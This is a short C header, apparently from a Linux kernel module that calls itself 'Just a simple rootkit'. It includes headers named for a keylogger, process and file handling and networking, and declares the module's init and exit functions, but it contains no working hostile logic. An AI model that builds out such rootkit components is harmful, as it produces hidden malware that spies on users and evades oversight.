#ifndef ROOTKIT_H
#define ROOTKIT_H
#include "keylogger.h"
#include "proc.h"
#include "file.h"
//#include "fops.h"
#include "module.h"
#include "network.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheH");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple rootkit");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
static int __init start_rootkit(void);
static void __exit remove_rootkit(void);
#endif